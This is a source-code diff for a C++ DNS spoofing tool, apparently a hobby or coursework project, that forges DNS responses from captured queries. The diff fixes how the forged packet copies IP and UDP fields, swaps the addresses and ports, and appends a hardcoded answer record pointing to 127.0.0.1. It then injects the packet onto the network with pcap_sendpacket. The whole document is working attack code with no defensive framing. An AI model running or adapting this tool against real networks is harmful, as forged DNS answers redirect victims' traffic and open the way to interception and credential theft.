@@ -15,7 +15,7 @@ struct IpHeader {
 	uint8_t frag_offs;
 	uint8_t ttl;
 	uint8_t proto;
-	uint16_t csum;
+	uint8_t chksm[2];
 	uint8_t src[4];
 	uint8_t dest[4];
 };
@@ -43,10 +43,10 @@ struct DnsAnswer {
 	uint8_t answerRR[2];
 	uint8_t authorityRR[2];
 	uint8_t addintionalRR[2]; 
-	char queryandanswer[];
+	char queryandanswer[100];
 };
 
-void DnsPoison::fill_dns_packet(uint8_t* dnsspoofpacket, const uint8_t *packet){
+int DnsPoison::fill_dns_packet(uint8_t* dnsspoofpacket, const uint8_t *packet){
 	
 	EthHeader *eth1 = (EthHeader *)packet;
 	IpHeader *ip1 = (IpHeader *)(packet + sizeof(EthHeader));
@@ -69,11 +69,11 @@ void DnsPoison::fill_dns_packet(uint8_t* dnsspoofpacket, const uint8_t *packet){
 	ip2->ihl = ip1->ihl;
 	ip2->tos = ip1->tos;
 	ip2->len = ip2->len;
-	ip2->frag_id = ip2->frag_id,
-	ip2->frag_offs = ip2->frag_offs;
-	ip2->ttl=  ip2->ttl ;
-	ip2->proto=ip2->proto ;
-	ip2->csum = ip2->csum;
+	ip2->frag_id = ip1->frag_id,
+	ip2->frag_offs = ip1->frag_offs;
+	ip2->ttl=  ip1->ttl ;
+	ip2->proto=ip1->proto ;
+	memcpy(ip2->chksm,"\x00\x00",2);
 	//print_payload(dnsspoofpacket, 100);
 
 	memcpy(ip2->dest, ip1->src, 4);
@@ -82,14 +82,15 @@ void DnsPoison::fill_dns_packet(uint8_t* dnsspoofpacket, const uint8_t *packet){
 	memcpy(udp2->destprt, udp1->srcprt, 2);
 	memcpy(udp2->srcprt, udp1->destprt, 2);
 
-	print_payload(dnsspoofpacket, 100);
+	//print_payload(dnsspoofpacket, 100);
 	// len and checksum for the end
 	memcpy(udp2->len, udp1->len, 2);
 	// copy dns request without name
 	memcpy(dnsa2, dnsa1, sizeof(DnsRequest) - 4);
-	int ql = strlen(dnsa1->query);
+	int ql = strlen(dnsa1->query)+1;
 	memcpy(dnsa2->queryandanswer, dnsa1->query, ql);
 	memcpy((dnsa2->queryandanswer) + ql, "\x00\x01\x00\x01\xc0\x0c\x00\x01\x00\x01\x00\x00\x00\x08\x00\x04\x7F\x00\x00\x01", 20);
+	return ql;
 }
 void DnsPoison::dothepoisoning(const uint8_t *packet,DnsRequest* check)
 {
@@ -119,15 +120,15 @@ void DnsPoison::dothepoisoning(const uint8_t *packet,DnsRequest* check)
 		fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
 		return;
 	}
-	uint8_t dnsspoofpacket[100];
-	fill_dns_packet(dnsspoofpacket, packet);
+	uint8_t dnsspoofpacket[256];
+	int querylegnth = fill_dns_packet(dnsspoofpacket, packet);
 
 	printf("print query\n");
 	print_payload(packet, 74);
 	printf("print answer\n");
 	print_payload(dnsspoofpacket, 74 + 20);
-	if (pcap_sendpacket(handle1, (const u_char*)dnsspoofpacket, 74+20) != 0) {
-				//fprintf(stderr, "Error sending packet: %s\n", pcap_geterr(pcap));
+	if (pcap_sendpacket(handle1, (const u_char*)dnsspoofpacket, 74+20-4) != 0) {
+				fprintf(stderr, "Error sending packet: %s\n", pcap_geterr(handle1));
 				return;
 	}
 }
